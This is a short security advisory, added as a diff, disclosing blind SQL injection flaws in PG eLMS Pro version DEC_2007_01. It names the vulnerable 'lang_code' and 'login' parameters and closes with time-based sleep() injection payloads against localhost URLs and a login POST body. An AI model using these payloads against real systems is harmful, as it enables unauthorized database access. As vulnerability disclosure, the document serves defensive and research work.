@@ -1,0 +1,46 @@
+PG eLMS Pro vDEC_2007_01 Multiple Blind SQL Injection Vulnerabilities
+
+Vendor: PilotGroup Ltd
+Product web page: http://www.elmspro.com
+Affected version: DEC_2007_01
+
+Summary: eLMS Pro solution is an outstanding and yet simple Learning Management
+system. Our product is designed for any education formations: from small distance
+training companies up to big colleges and universities. The system allows to build
+courses, import SCORM content, deploy online learning, manage users, communicate
+with users, track training results, and more.
+
+Desc: Input passed via the 'lang_code' GET parameter to index.php and login.php
+in '/www/core/language.class.php', and 'login' POST parameter to login.php is
+not properly sanitised before being used in SQL queries. This can be exploited
+to manipulate SQL queries by injecting arbitrary SQL code.
+
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+           Apache 1.3.27 (Win32)
+           PHP 5.2.4
+           MySQL 14.14 Distrib 5.1.43 (Win32-ia32)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            liquidworm gmail com
+                            Zero Science Lab
+
+
+Advisory ID: ZSL-2011-5028
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5028.php
+
+
+
+08.07.2011
+
+
+--
+
+
+- http://localhost:6450/index.php?lang_code=1'+and+sleep(5)%23 (get)
+- http://localhost:6450/login.php?lang_code=1'+and+sleep(5)%23 (get)
+
+- http://localhost:6450/login.php (post)
+
+  login=r00t'+or+sleep(5)%23&password=t00t!
